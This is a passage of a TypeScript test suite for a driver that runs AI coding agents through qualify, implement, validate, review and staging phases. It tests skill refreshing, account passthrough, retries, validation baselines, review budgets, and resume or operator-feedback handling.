    mkdirSync(join(bundledRoot, 'cez-harness', 'scripts'), { recursive: true });
    writeFileSync(join(bundledRoot, 'cez-harness', 'SKILL.md'), '# cez-harness (bundled, current)\n', 'utf8');
    writeFileSync(join(bundledRoot, 'cez-harness', 'scripts', 'harness.mjs'), '// bundled-current cez-harness\n', 'utf8');
    h.deps.bundledSkillsRoot = bundledRoot;
    const stale = join(dir, '.claude', 'skills', 'cez-harness');
    mkdirSync(join(stale, 'scripts'), { recursive: true });
    writeFileSync(join(stale, 'scripts', 'harness.mjs'), '// FROZEN 12:22 SNAPSHOT\n', 'utf8');
    const ensuredSkills: string[] = [];
    h.host.ensureSkill = async (name) => {
      ensuredSkills.push(name);
      materializeTestSkill(dir, name);
      return true;
    };

    const error = await runHarnessDriver(h.host, input, h.deps);

    expect(error).toBeNull();
    expect(readFileSync(join(stale, 'scripts', 'harness.mjs'), 'utf8')).toContain('bundled-current');
    expect(readFileSync(join(stale, 'scripts', 'harness.mjs'), 'utf8')).not.toContain('FROZEN');
    expect(ensuredSkills).toEqual(ISSUE_PHASE_SKILLS);
    expect(h.runtimeEnv()?.CEZ_HARNESS_REVIEW_SKILL).toBe('om-code-review');
  });

  it('uses complete generic phase skills without putting workflow instructions in the task brief', async () => {
    const h = makeHarness(dir);
    const ensuredSkills: string[] = [];
    h.host.ensureSkill = async (name) => {
      ensuredSkills.push(name);
      materializeTestSkill(dir, name);
      return true;
    };

    const error = await runHarnessDriver(
      h.host,
      { ...input, skillProfile: 'generic', task: 'Customers need CSV exports.' },
      h.deps,
    );

    expect(error).toBeNull();
    expect(ensuredSkills).toEqual([
      'cez-harness',
      'cez-verify-in-repo',
      'cez-root-cause',
      'cez-fix',
      'cez-code-review',
    ]);
    expect(h.runtimeEnv()?.CEZ_HARNESS_REVIEW_SKILL).toBe('cez-code-review');
    expect(
      h.calls.find((call) => call.kind === 'agent' && call.id === 'qualify')?.skill,
    ).toBe('cez-verify-in-repo');
  });

  // worker adapters and advisors spawned their CLIs on the default login, billing
  // the personal subscription of a project bound to a work account.
  it('runs the vendored runtime on the project\'s selected accounts', async () => {
    const home = join(dir, 'home');
    const codexWork = join(dir, 'codex-work');
    mkdirSync(home, { recursive: true });
    writeFileSync(join(home, 'agent-accounts.json'), JSON.stringify({
      version: 1,
      accounts: [{ id: 'work', provider: 'codex', configDir: codexWork }],
      selections: { [dir]: { codex: 'work' } },
    }));
    vi.stubEnv('CEZ_HOME', home);
    vi.stubEnv('CLAUDE_CONFIG_DIR', join(dir, 'claude-moved'));
    try {
      const h = makeHarness(dir);
      expect(await runHarnessDriver(h.host, input, h.deps)).toBeNull();
      expect(h.runtimeEnv()).toMatchObject({ CODEX_HOME: codexWork, CLAUDE_CONFIG_DIR: join(dir, 'claude-moved') });
    } finally {
      vi.unstubAllEnvs();
    }
  });

  // Review round 2: the runtime's allowlisted child env dropped the account relocation the driver
  // handed it, so a command reviewer ran on the default login the project had moved away from.
  it('passes the selected accounts through to a command reviewer\'s own process', async () => {
    // The real runtime's `review` op insists its artifact dir is git-ignored inside the worktree.
    const git = (...args: string[]) => execFileSync('git', args, { cwd: dir, encoding: 'utf8' });
    git('init', '-q', '-b', 'main');
    git('config', 'user.email', 'test@local');
    git('config', 'user.name', 'test');
    mkdirSync(join(dir, 'src/runs'), { recursive: true });
    writeFileSync(join(dir, 'src/runs/store.ts'), 'base\n');
    git('add', 'src');
    git('commit', '-qm', 'base');
    pinWorktreeGitDir(dir, join(dir, '.git'));
    writeFileSync(join(dir, '.git/info/exclude'), '.ai/cezar/\n.claude/\n');
    const home = join(dir, 'home');
    const codexWork = join(dir, 'codex-work');
    const claudeMoved = join(dir, 'claude-moved');
    mkdirSync(home, { recursive: true });
    writeFileSync(join(home, 'agent-accounts.json'), JSON.stringify({
      version: 1,
      accounts: [{ id: 'work', provider: 'codex', configDir: codexWork }],
      selections: { [dir]: { codex: 'work' } },
    }));
    const seen = join(dir, 'reviewer-env.json');
    const command = join(dir, '.ai/cezar/reviewer.cjs');
    writeFileSync(command, `require('fs').writeFileSync(${JSON.stringify(seen)}, JSON.stringify({ CODEX_HOME: process.env.CODEX_HOME, CLAUDE_CONFIG_DIR: process.env.CLAUDE_CONFIG_DIR })); process.stdin.resume(); process.stdin.on('end', () => process.stdout.write(JSON.stringify({ verdict: 'approve', notes: [], findings: [] })));`);
    const script = new URL('../../vendor/skills/cez-harness/scripts/harness.mjs', import.meta.url).pathname;
    vi.stubEnv('CEZ_HOME', home);
    vi.stubEnv('CLAUDE_CONFIG_DIR', claudeMoved);
    try {
      const h = makeHarness(dir);
      h.agentBehavior.set('implement', (req) => {
        writeFileSync(join(dir, 'src/runs/store.ts'), 'implementation\n');
        writeFileSync(req.resultPath, JSON.stringify({ changedPaths: ['src/runs/store.ts'] }));
        return null;
      });
      const create = h.deps.createRuntime!;
      h.deps.createRuntime = (opts) => {
        const fake = create(opts);
        return { ...fake, run: async (op, args, options) => {
          if (op !== 'review') return fake.run(op, args, options);
          const configPath = args[args.indexOf('--config') + 1]!;
          const cfg = JSON.parse(readFileSync(configPath, 'utf8'));
          for (const model of Object.values(cfg.agentHarness.models) as Array<Record<string, unknown>>) {
            model.adapter = 'command';
            model.commands = { review: [process.execPath, command] };
          }
          writeFileSync(configPath, JSON.stringify(cfg));
          // The driver's own runtime env, the way HarnessRuntime spawns the script; the fake host
          // names the upstream review skill, the bundled runtime ships the cez-* one.
          const real = spawnSync(process.execPath, [script, op, ...args], {
            cwd: dir, encoding: 'utf8', env: { ...process.env, ...opts.env, CEZ_HARNESS_REVIEW_SKILL: 'cez-code-review' },
          });
          return { ok: real.status === 0, exitCode: real.status ?? 1, stdout: real.stdout, stderr: real.stderr, durationMs: 0 };
        } };
      };
      // A Codex reviewer is what makes the council an advisor run through the runtime's `review` op.
      const roles = {
        orchestrator: { runner: 'claude' as const, model: 'sonnet' },
        implementer: { runner: 'codex' as const, model: 'gpt-5.6-sol' },
        reviewers: [{ runner: 'claude' as const, model: 'opus' }, { runner: 'codex' as const, model: 'gpt-5.6-sol' }],
      };
      expect(await runHarnessDriver(h.host, { ...input, roles }, h.deps)).toBeNull();
      expect(loadLedger(h.host.dataDir, h.host.runId)?.invocations.filter((row) => row.id.startsWith('advisor:')).map((row) => row.status)).toEqual(['completed']);
      expect(JSON.parse(readFileSync(seen, 'utf8'))).toEqual({ CODEX_HOME: codexWork, CLAUDE_CONFIG_DIR: claudeMoved });
    } finally {
      vi.unstubAllEnvs();
    }
  }, 15_000);

  it('composes a repo-local om-code-review extension over the complete shared skill', async () => {
    const h = makeHarness(dir);
    const bundledRoot = join(dir, 'fake-bundled');
    mkdirSync(join(bundledRoot, 'cez-harness', 'scripts'), { recursive: true });
    writeFileSync(join(bundledRoot, 'cez-harness', 'SKILL.md'), '# wrapper\n', 'utf8');
    writeFileSync(join(bundledRoot, 'cez-harness', 'scripts', 'harness.mjs'), '// runtime\n', 'utf8');
    h.deps.bundledSkillsRoot = bundledRoot;

    const sharedRoot = join(dir, 'shared-skills');
    writeTestSkill(sharedRoot, 'om-code-review', '# complete shared review workflow\n');
    h.host.ensureSkill = async (name) => {
      materializeTestSkill(
        dir,
        name,
        name === 'om-code-review' ? '# repository extension rules\n' : `# ${name}\n`,
      );
      if (name === 'om-code-review') {
        rmSync(join(dir, '.claude', 'skills', name, 'references'), {
          recursive: true,
          force: true,
        });
      }
      return true;
    };
    h.deps.discoverSkillCandidates = async (_repoRoot, name) =>
      name === 'om-code-review'
        ? [
            {
              name,
              body: '# repository extension rules',
              path: join(dir, '.claude', 'skills', name, 'SKILL.md'),
              source: 'ai',
            },
            {
              name,
              body: '# complete shared review workflow',
              path: join(sharedRoot, name, 'SKILL.md'),
              source: 'global',
            },
          ]
        : [];
    let reviewSystemPrompt = '';
    h.agentBehavior.set('review', (req) => {
      reviewSystemPrompt = req.skillSystemPrompt ?? '';
      writeFileSync(
        req.resultPath,
        JSON.stringify({ verdict: 'approve', findings: [] }),
        'utf8',
      );
      return null;
    });

    expect(await runHarnessDriver(h.host, input, h.deps)).toBeNull();
    expect(reviewSystemPrompt).toContain('complete shared review workflow');
    expect(reviewSystemPrompt).toContain('repository extension rules');
    expect(
      readFileSync(
        join(
          harnessArtifactDir(h.host.dataDir, h.host.runId),
          'trusted-skills',
          'om-code-review',
          'references',
          'review-checklist.md',
        ),
        'utf8',
      ),
    ).toContain('complete shared review checklist');
  });

  it('runs the full graph in order and stages the declared allowlist', async () => {
    const h = makeHarness(dir);
    const error = await runHarnessDriver(h.host, input, h.deps);
    expect(error).toBeNull();

    const order = h.calls.map((c) => c.id);
    expect(order[0]).toBe('capture');
    expect(order[order.length - 1]).toBe('stage');
    expect(order.indexOf('qualify')).toBeLessThan(order.indexOf('diagnose'));
    expect(order.indexOf('diagnose')).toBeLessThan(order.indexOf('implement'));
    expect(order.indexOf('implement')).toBeLessThan(order.indexOf('review'));
    expect(h.calls.filter((call) => call.kind === 'agent').map((call) => call.skill)).toEqual([
      'om-verify-in-repo',
      'om-root-cause',
      'om-fix',
      'om-code-review',
    ]);

    const stage = h.ops.find((o) => o.id === 'stage');
    expect(stage?.args).toContain('--paths-file');
    const pathsFile = stage!.args![stage!.args!.indexOf('--paths-file') + 1]!;
    expect(readFileSync(pathsFile, 'utf8').trim().split('\n').sort()).toEqual([
      'src/runs/store.ts',
      'test/unit/store.test.ts',
    ]);

    const ledger = loadLedger(h.host.dataDir, h.host.runId);
    expect(ledger?.stage.status).toBe('staged');
    expect(ledger?.stage.suggestedCommit).toBe('fix(runs): guard replay');
    expect(ledger?.phases.every((p) => p.status === 'done')).toBe(true);
    expect(h.events.some((e) => e.type === 'harness.stage.updated')).toBe(true);
    expect(h.events.some((e) => e.type === 'harness.readiness.updated')).toBe(true);
  });

  it('surfaces stage warnings in the run log and the prepared PR body', async () => {
    const h = makeHarness(dir);
    h.stageWarnings.push('whitespace findings in the staged diff (cosmetic):\nspec.md:3: trailing whitespace');
    const error = await runHarnessDriver(h.host, input, h.deps);
    expect(error).toBeNull();
    const ledger = loadLedger(h.host.dataDir, h.host.runId);
    expect(ledger?.stage.status).toBe('staged');
    const notes = h.events.filter((e) => e.type === 'note').map((e) => String(e.message));
    expect(notes.some((n) => n.includes('staged with a warning') && n.includes('trailing whitespace'))).toBe(true);
    expect(ledger?.stage.prBody).toContain('## Handoff warnings');
    expect(ledger?.stage.prBody).toContain('trailing whitespace');
  });

  it('stops successfully after qualify reports no_action, skipping the rest', async () => {
    const h = makeHarness(dir);
    h.agentBehavior.set('qualify', (req) => {
      writeFileSync(req.resultPath, JSON.stringify({ outcome: 'no_action', evidence: 'already fixed by #640' }), 'utf8');
      return null;
    });
    const error = await runHarnessDriver(h.host, input, h.deps);
    expect(error).toBeNull();
    expect(h.calls.map((c) => c.id)).not.toContain('diagnose');
    expect(h.calls.map((c) => c.id)).not.toContain('stage');
    expect(h.steps.get('diagnose')).toBe('skipped');
    expect(h.steps.get('stage')).toBe('skipped');
    const ledger = loadLedger(h.host.dataDir, h.host.runId);
    expect(ledger?.phases.find((p) => p.id === 'qualify')?.status).toBe('done');
  });

  it('retries a phase once on a malformed result, then fails the run', async () => {
    const h = makeHarness(dir);
    let attempts = 0;
    h.agentBehavior.set('qualify', (req) => {
      attempts += 1;
      writeFileSync(req.resultPath, 'not json at all', 'utf8');
      return null;
    });
    const error = await runHarnessDriver(h.host, input, h.deps);
    expect(attempts).toBe(2);
    expect(error).toMatch(/qualify/);
    const ledger = loadLedger(h.host.dataDir, h.host.runId);
    expect(ledger?.phases.find((p) => p.id === 'qualify')?.status).toBe('failed');
  });

  it('guard: rejects an oversized phase artifact without parsing it into memory', async () => {
    const h = makeHarness(dir);
    let attempts = 0;
    h.agentBehavior.set('qualify', (req) => {
      attempts += 1;
      writeFileSync(req.resultPath, 'x'.repeat(2_000_001), 'utf8');
      return null;
    });

    const error = await runHarnessDriver(h.host, input, h.deps);

    expect(attempts).toBe(2);
    expect(error).toMatch(/exceeding the 2000000-byte safety limit/);
    expect(h.calls.map((call) => call.id)).not.toContain('diagnose');
  });

  it('budgets the pinned skill prompt together with the phase prompt before model work', async () => {
    const h = makeHarness(dir);
    const bundledRoot = join(dir, 'oversized-bundled');
    writeTestSkill(bundledRoot, 'cez-harness');
    h.deps.bundledSkillsRoot = bundledRoot;
    h.host.ensureSkill = async (name) => {
      materializeTestSkill(
        dir,
        name,
        name === 'om-verify-in-repo' ? 'x'.repeat(180_000) : `# ${name}\n`,
      );
      return true;
    };

    const error = await runHarnessDriver(h.host, input, h.deps);

    expect(error).toMatch(/qualify.*exceeding the 180000-byte input budget/);
    expect(h.calls.filter((call) => call.kind === 'agent')).toHaveLength(0);
  });

  it('tells the retry session what the first attempt got wrong', async () => {
    const h = makeHarness(dir);
    const prompts: string[] = [];
    h.agentBehavior.set('implement', (req) => {
      prompts.push(req.prompt);
      writeFileSync(
        req.resultPath,
        prompts.length === 1
          ? 'I finished the work! Summary: everything went great.'
          : JSON.stringify({ changedPaths: ['src/fix.ts'], summary: 'done' }),
        'utf8',
      );
      return null;
    });

    const error = await runHarnessDriver(h.host, input, h.deps);

    expect(error).toBeNull();
    expect(prompts).toHaveLength(2);
    expect(prompts[0]).not.toContain('RESULT-CONTRACT RETRY');
    expect(prompts[1]).toContain('RESULT-CONTRACT RETRY');
    expect(prompts[1]).toContain('do not contain the contracted JSON object');
    expect(prompts[1]).toContain('worktree edits');
    const notes = h.events.filter((e) => e.type === 'note').map((e) => String(e.message));
    expect(notes.some((n) => n.includes('told what was wrong'))).toBe(true);
  });

  it('adopts a valid result written during a previously rejected attempt without another model call', async () => {
    const h = makeHarness(dir);
    h.agentBehavior.set('qualify', (req) => {
      writeFileSync(req.resultPath, 'not json at all', 'utf8');
      return null;
    });
    await expect(runHarnessDriver(h.host, input, h.deps)).resolves.toMatch(/qualify/);
    const failed = loadLedger(h.host.dataDir, h.host.runId)?.invocations.find(
      (invocation) => invocation.phaseId === 'qualify',
    );
    expect(failed).toMatchObject({
      status: 'failed',
      attempt: 2,
      error: expect.stringContaining('ended without a valid result file'),
    });
    const resultPath = join(
      harnessAgentOutputDir(h.host.dataDir, h.host.runId),
      'phase-qualify',
      'result.json',
    );
    writeFileSync(
      resultPath,
      JSON.stringify({ outcome: 'work_needed', evidence: 'recovered evidence' }),
      'utf8',
    );
    const writtenAt = new Date(
      (Date.parse(failed!.startedAt!) + Date.parse(failed!.endedAt!)) / 2,
    );
    utimesSync(resultPath, writtenAt, writtenAt);
    const callsBeforeRecovery = h.calls.filter((call) => call.id === 'qualify').length;

    await expect(runHarnessDriver(h.host, input, h.deps)).resolves.toBeNull();

    expect(h.calls.filter((call) => call.id === 'qualify')).toHaveLength(callsBeforeRecovery);
    expect(
      loadLedger(h.host.dataDir, h.host.runId)?.invocations.find(
        (invocation) => invocation.phaseId === 'qualify',
      ),
    ).toMatchObject({ status: 'completed', artifactPath: resultPath });
    expect(
      h.events.some(
        (event) =>
          event.type === 'note' &&
          String(event.message).includes('no model rerun was needed'),
      ),
    ).toBe(true);
  });

  it('loops implement→validate→review on request_changes and stages after the fix round', async () => {
    const h = makeHarness(dir);
    let round = 0;
    h.agentBehavior.set('review', (req) => {
      round += 1;
      writeFileSync(
        req.resultPath,
        JSON.stringify(
          round === 1
            ? { verdict: 'request_changes', findings: [{ severity: 'blocker', title: 'TOCTOU remains' }] }
            : { verdict: 'approve', findings: [] },
        ),
        'utf8',
      );
      return null;
    });
    h.agentBehavior.set('fix-2', (req) => {
      writeFileSync(
        req.resultPath,
        JSON.stringify({ changedPaths: [], summary: 'the existing fix already satisfies the finding' }),
        'utf8',
      );
      return null;
    });
    const error = await runHarnessDriver(h.host, input, h.deps);
    expect(error).toBeNull();
    const order = h.calls.map((c) => c.id);
    expect(order.filter((id) => id.startsWith('review'))).toHaveLength(2);
    expect(order.filter((id) => id === 'fix-2')).toHaveLength(1);
    const ledger = loadLedger(h.host.dataDir, h.host.runId);
    expect(ledger?.loops.fixRounds).toBe(1);
    expect(ledger?.stage.status).toBe('staged');
  });

  it('applies the third code-review cycle findings before staging', async () => {
    const h = makeHarness(dir);
    h.agentBehavior.set('review', (req) => {
      writeFileSync(
        req.resultPath,
        JSON.stringify({ verdict: 'request_changes', findings: [{ severity: 'blocker', title: 'still broken' }] }),
        'utf8',
      );
      return null;
    });
    for (const id of ['fix-2', 'fix-3', 'fix-final']) {
      h.agentBehavior.set(id, (req) => {
        writeFileSync(req.resultPath, JSON.stringify({ changedPaths: ['src/runs/store.ts'] }), 'utf8');
        return null;
      });
    }
    const error = await runHarnessDriver(h.host, input, h.deps);
    expect(error).toBeNull();
    expect(h.calls.filter((c) => c.id.startsWith('review'))).toHaveLength(3);
    expect(h.calls.map((c) => c.id)).toContain('fix-final');
    expect(h.calls.map((c) => c.id)).toContain('stage');
    const notes = h.events.filter((e) => e.type === 'note').map((e) => String(e.message));
    expect(notes.some((n) => n.includes('applying its confirmed findings'))).toBe(true);
    // the closing fixes are never re-reviewed, so the spec keeps their blockers
    // contested (2026-07-23-harness-orchestration), not represented as verified.
    const ledger = loadLedger(h.host.dataDir, h.host.runId);
    expect(ledger?.outcome.status).toBe('contested');
    expect(ledger?.outcome.blockingReasons).toEqual([
      '[blocker] still broken — addressed by the closing fix, not re-reviewed (raised by claude)',
    ]);
    expect(ledger?.stage.prBody).toContain('still broken — addressed by the closing fix, not re-reviewed');
    expect(ledger?.decisions.some((d) => d.kind === 'review.closing-fixes')).toBe(true);
  });

  /**
   * Regression (run 71edb02c): a red validation gate short-circuits the council
   * (no review runs that round), but the round was still charged to the review
   * budget. That run's first gate failed on pre-existing breakage the reviewers
   * never saw, so it got two review rounds instead of three and the councils ran
   * out mid-disagreement. Repair rounds have their own budget now.
   */
  it('does not charge a validation repair round to the review budget', async () => {
    const h = makeHarness(dir);
    let gate = 0;
    h.deps.validate = async (commands: string[]) => {
      gate += 1;
      const failed = gate === 2;
      return commands.map((command) => ({
        command,
        status: failed ? ('failed' as const) : ('passed' as const),
        exitCode: failed ? 1 : 0,
        evidence: failed ? 'a regression the reviewers never saw' : 'ok',
      }));
    };
    h.agentBehavior.set('review', (req) => {
      writeFileSync(
        req.resultPath,
        JSON.stringify({ verdict: 'request_changes', findings: [{ severity: 'blocker', title: 'still broken' }] }),
        'utf8',
      );
      return null;
    });
    for (const id of ['fix-2', 'fix-3', 'fix-4', 'fix-final']) {
      h.agentBehavior.set(id, (req) => {
        writeFileSync(req.resultPath, JSON.stringify({ changedPaths: ['src/runs/store.ts'] }), 'utf8');
        return null;
      });
    }
    const error = await runHarnessDriver(h.host, input, h.deps);
    expect(error).toBeNull();
    expect(h.calls.filter((c) => c.id.startsWith('review'))).toHaveLength(3);
    const notes = h.events.filter((e) => e.type === 'note').map((e) => String(e.message));
    expect(notes.some((n) => n.includes('does NOT consume a review round'))).toBe(true);
  });

  /**
   * Regression (run c54c2ed4): the repo's own base branch had a failing test
   * (`explicit-sort-comparators` flagging an upstream script). The gate charged
   * that debt to the run — three repair rounds fixing upstream breakage, then a
   * dead run "still failing" on a failure that predated its first edit. The
   * baseline gate measures the untouched worktree once; identical failures are
   * tolerated loudly, and only regressions beyond the baseline block.
   */
  it('tolerates a pre-existing baseline failure and completes without a repair round', async () => {
    const h = makeHarness(dir);
    h.deps.validate = async (commands: string[]) =>
      commands.map((command) => ({
        command,
        status: 'failed' as const,
        exitCode: 1,
        evidence: 'FAIL src/upstream.test.ts',
        failureIds: ['fail:src/upstream.test.ts'],
      }));
    let reviewPrompt = '';
    h.agentBehavior.set('review', (req) => {
      reviewPrompt = req.prompt;
      writeFileSync(req.resultPath, JSON.stringify({ verdict: 'approve', findings: [] }), 'utf8');
      return null;
    });

    const error = await runHarnessDriver(h.host, input, h.deps);

    expect(error).toBeNull();
    expect(h.calls.map((c) => c.id)).toContain('stage');
    expect(h.calls.filter((c) => c.id.startsWith('fix-'))).toHaveLength(0);
    const notes = h.events.filter((e) => e.type === 'note').map((e) => String(e.message));
    expect(notes.some((n) => n.includes('RED on the untouched worktree'))).toBe(true);
    expect(notes.some((n) => n.includes('tolerating 1 pre-existing failure'))).toBe(true);
    expect(reviewPrompt).toContain('tolerated as pre-existing');
    const ledger = loadLedger(h.host.dataDir, h.host.runId);
    expect(ledger?.baselineValidation?.[0]?.status).toBe('failed');
    expect(ledger?.validation[0]?.preexisting).toBe(true);
    expect(ledger?.decisions.some((d) => d.kind === 'validation.preexisting-tolerated')).toBe(true);
    expect(ledger?.decisions.some((d) => d.kind === 'baseline-gate.red')).toBe(true);
  });

  it('blocks on failures beyond the baseline set and names the new identities', async () => {
    const h = makeHarness(dir);
    let gate = 0;
    h.deps.validate = async (commands: string[]) => {
      gate += 1;
      const baselineCall = gate === 1;
      return commands.map((command) => ({
        command,
        status: 'failed' as const,
        exitCode: 1,
        evidence: baselineCall
          ? 'FAIL src/upstream.test.ts'
          : 'FAIL src/upstream.test.ts\nFAIL src/new-breakage.test.ts',
        failureIds: baselineCall
          ? ['fail:src/upstream.test.ts']
          : ['fail:src/upstream.test.ts', 'fail:src/new-breakage.test.ts'],
      }));
    };
    for (const id of ['fix-2', 'fix-3']) {
      h.agentBehavior.set(id, (req) => {
        writeFileSync(req.resultPath, JSON.stringify({ changedPaths: ['src/runs/store.ts'] }), 'utf8');
        return null;
      });
    }

    const error = await runHarnessDriver(h.host, input, h.deps);

    expect(error).toMatch(/validation gate still failing/);
    expect(error).toMatch(/new failures vs baseline: fail:src\/new-breakage\.test\.ts/);
    expect(error).not.toMatch(/new failures vs baseline: fail:src\/upstream\.test\.ts/);
    expect(h.calls.map((c) => c.id)).not.toContain('stage');
  });

  // the gate stopped at its first failure, so a command red on main hid every
  // command after it — in the baseline and in the run.
  it('runs the baseline in full and lets the run gate continue past a baseline-red command', async () => {
    const h = makeHarness(dir);
    h.deps.loadAgentic = async () => ({ baseBranch: 'main', validationCommands: ['yarn lint', 'yarn test'], agentHarness: undefined });
    const continued: Array<string[]> = [];
    h.deps.validate = async (commands: string[], _cwd, opts) => {
      continued.push([...(opts?.continueAfter ?? [])]);
      return commands.map((command) =>
        command === 'yarn lint'
          ? { command, status: 'failed' as const, exitCode: 1, evidence: 'x', failureIds: ['line:src/a.ts: no-unused-vars'] }
          : { command, status: 'passed' as const, exitCode: 0, evidence: 'ok' },
      );
    };

    expect(await runHarnessDriver(h.host, input, h.deps)).toBeNull();

    expect(continued[0]).toEqual(['yarn lint', 'yarn test']);
    expect(continued[1]).toEqual(['yarn lint']);
  });

  it('pays the baseline gate once — a resume reuses it hash-bound', async () => {
    const h = makeHarness(dir);
    let calls = 0;
    h.deps.validate = async (commands: string[]) => {
      calls += 1;
      return commands.map((command) => ({
        command,
        status: 'passed' as const,
        exitCode: 0,
        evidence: 'ok',
      }));
    };
    expect(await runHarnessDriver(h.host, input, h.deps)).toBeNull();
    expect(calls).toBe(2); // baseline + the round-1 validate

    const resumed = makeHarness(dir);
    let resumedCalls = 0;
    resumed.deps.validate = async (commands: string[]) => {
      resumedCalls += 1;
      return commands.map((command) => ({
        command,
        status: 'passed' as const,
        exitCode: 0,
        evidence: 'ok',
      }));
    };
    expect(await runHarnessDriver(resumed.host, input, resumed.deps)).toBeNull();
    expect(resumedCalls).toBe(0);
  });

  /** A review subject that moves with the worktree, as the real snapshot does. The
   *  constant stub hid a resume replaying round 1 against round 2's diff. */
  const trackSubject = (h: ReturnType<typeof makeHarness>) => {
    const file = join(dir, 'src', 'runs', 'store.ts');
    h.deps.snapshotReviewSubject = async () => {
      try {
        return createHash('sha256').update(readFileSync(file)).digest('hex');
      } catch {
        return 'untouched';
      }
    };
    return (content: string) => {
      mkdirSync(dirname(file), { recursive: true });
      writeFileSync(file, content, 'utf8');
    };
  };

  it('resumes at the first incomplete round instead of replaying round 1 against a later diff', async () => {
    const first = makeHarness(dir);
    const edit = trackSubject(first);
    first.agentBehavior.set('implement', (req) => {
      edit('round 1');
      writeFileSync(
        req.resultPath,
        JSON.stringify({ changedPaths: ['src/runs/store.ts'], suggestedCommit: 'fix(runs): guard replay' }),
        'utf8',
      );
      return null;
    });
    first.agentBehavior.set('review', (req) => {
      writeFileSync(
        req.resultPath,
        JSON.stringify({ verdict: 'request_changes', findings: [{ severity: 'blocker', title: 'TOCTOU remains' }] }),
        'utf8',
      );
      return null;
    });
    first.agentBehavior.set('fix-2', (req) => {
      edit('round 2');
      writeFileSync(
        req.resultPath,
        JSON.stringify({ changedPaths: ['src/runs/store.ts'], summary: 'guarded the replay' }),
        'utf8',
      );
      return null;
    });
    first.agentBehavior.set('review-2', () => 'claude exited before writing its review');
    expect(await runHarnessDriver(first.host, input, first.deps)).toMatch(/review-2/);

    const resumed = makeHarness(dir);
    trackSubject(resumed);
    let gates = 0;
    resumed.deps.validate = async (commands: string[]) => {
      gates += 1;
      return commands.map((command) => ({ command, status: 'passed' as const, exitCode: 0, evidence: 'ok' }));
    };
    let reviewPrompt = '';
    resumed.agentBehavior.set('review-2', (req) => {
      reviewPrompt = req.prompt;
      writeFileSync(req.resultPath, JSON.stringify({ verdict: 'approve', findings: [] }), 'utf8');
      return null;
    });

    expect(await runHarnessDriver(resumed.host, input, resumed.deps)).toBeNull();

    expect(resumed.calls.filter((call) => call.kind === 'agent').map((call) => call.id)).toEqual(['review-2']);
    expect(gates).toBe(0);
    expect(reviewPrompt).toContain('Round 1 required:');
    expect(reviewPrompt).toContain('TOCTOU remains');
    expect(reviewPrompt).toContain('Round 1 response: guarded the replay');
    const ledger = loadLedger(resumed.host.dataDir, resumed.host.runId);
    expect(ledger?.stage).toMatchObject({ status: 'staged', suggestedCommit: 'fix(runs): guard replay' });
    expect(ledger?.loops.fixRounds).toBe(1);
    expect(ledger?.rounds?.implementation).toMatchObject({ round: 2, validationRepairRounds: 0 });
  });

  it('keeps the spent validation repair budget across a Continue', async () => {
    const first = makeHarness(dir);
    const edit = trackSubject(first);
    let gate = 0;
    first.deps.validate = async (commands: string[]) => {
      gate += 1;
      return commands.map((command) =>
        gate === 1
          ? { command, status: 'passed' as const, exitCode: 0, evidence: 'ok' }
          : { command, status: 'failed' as const, exitCode: 1, evidence: `still red (gate ${gate})` },
      );
    };
    for (const id of ['implement', 'fix-2', 'fix-3']) {
      first.agentBehavior.set(id, (req) => {
        edit(id);
        writeFileSync(req.resultPath, JSON.stringify({ changedPaths: ['src/runs/store.ts'] }), 'utf8');
        return null;
      });
    }
    expect(await runHarnessDriver(first.host, input, first.deps)).toMatch(
      /validation gate still failing after 3 repair rounds/,
    );

    const resumed = makeHarness(dir);
    trackSubject(resumed);
    let gates = 0;
    resumed.deps.validate = async (commands: string[]) => {
      gates += 1;
      return commands.map((command) => ({
        command,
        status: 'failed' as const,
        exitCode: 1,
        evidence: 'still red after Continue',
      }));
    };

    expect(await runHarnessDriver(resumed.host, input, resumed.deps)).toMatch(
      /validation gate still failing after 3 repair rounds/,
    );

    expect(resumed.calls.filter((call) => call.kind === 'agent')).toEqual([]);
    expect(gates).toBe(0);
  });

  it('restarts a multi-round loop at round 1 when operator feedback reopens implementation', async () => {
    const first = makeHarness(dir);
    let reviews = 0;
    first.agentBehavior.set('review', (req) => {
      reviews += 1;
      writeFileSync(
        req.resultPath,
        JSON.stringify(
          reviews === 1
            ? { verdict: 'request_changes', findings: [{ severity: 'blocker', title: 'TOCTOU remains' }] }
            : { verdict: 'approve', findings: [] },
        ),
        'utf8',
      );
      return null;
    });
    first.agentBehavior.set('fix-2', (req) => {
      writeFileSync(req.resultPath, JSON.stringify({ changedPaths: ['src/runs/store.ts'] }), 'utf8');
      return null;
    });
    expect(await runHarnessDriver(first.host, input, first.deps)).toBeNull();
    const ledger = loadLedger(first.host.dataDir, first.host.runId)!;
    ledger.pendingMessages.push({
      id: 'feedback-1',
      text: 'Keep the queue order stable.',
      createdAt: new Date().toISOString(),
    });
    saveLedger(first.host.dataDir, first.host.runId, ledger);

    const resumed = makeHarness(dir);
    expect(await runHarnessDriver(resumed.host, input, resumed.deps)).toBeNull();

    expect(resumed.calls.filter((call) => call.kind === 'agent').map((call) => call.id))
      .toEqual(['implement', 'review']);
    expect(loadLedger(first.host.dataDir, first.host.runId)?.loops.fixRounds).toBe(0);
  });

  // a message the server queued while the stage op ran was acknowledged,
  // then dropped — the outcome turned ready without reading it.
  it('blocks the handoff on a message that arrives while staging runs', async () => {
    const h = makeHarness(dir);
    const create = h.deps.createRuntime!;
    h.deps.createRuntime = (opts) => {
      const runtime = create(opts);
      return {
        ...runtime,
        run: async (op, args, options) => {
          if (op === 'stage') {
            const external = loadLedger(h.host.dataDir, h.host.runId)!;
            external.pendingMessages.push({ id: 'during-stage', text: 'Rename the helper too.', createdAt: new Date().toISOString() });
            saveLedger(h.host.dataDir, h.host.runId, external);
          }
          return runtime.run(op, args, options);
        },
      };
    };

    expect(await runHarnessDriver(h.host, input, h.deps)).toMatch(/during-stage/);
    const ledger = loadLedger(h.host.dataDir, h.host.runId)!;
    expect(ledger.outcome.status).toBe('blocked');
    expect(ledger.pendingMessages).toEqual([expect.objectContaining({ id: 'during-stage' })]);
    expect(ledger.pendingMessages[0]?.consumedAt).toBeUndefined();
  });

  // fix-2 took a message and failed; feedback then restarted at implement, round 1
  // approved, and the message — still assigned to the superseded fix-2 — blocked staging forever.
  it('hands a superseded phase’s unconsumed message to the feedback restart', async () => {
    const first = makeHarness(dir);
    first.agentBehavior.set('review', (req) => {
      const external = loadLedger(first.host.dataDir, first.host.runId)!;
      external.pendingMessages.push({ id: 'during-review', text: 'Keep the alias.', createdAt: new Date().toISOString() });
      saveLedger(first.host.dataDir, first.host.runId, external);
      writeFileSync(
        req.resultPath,
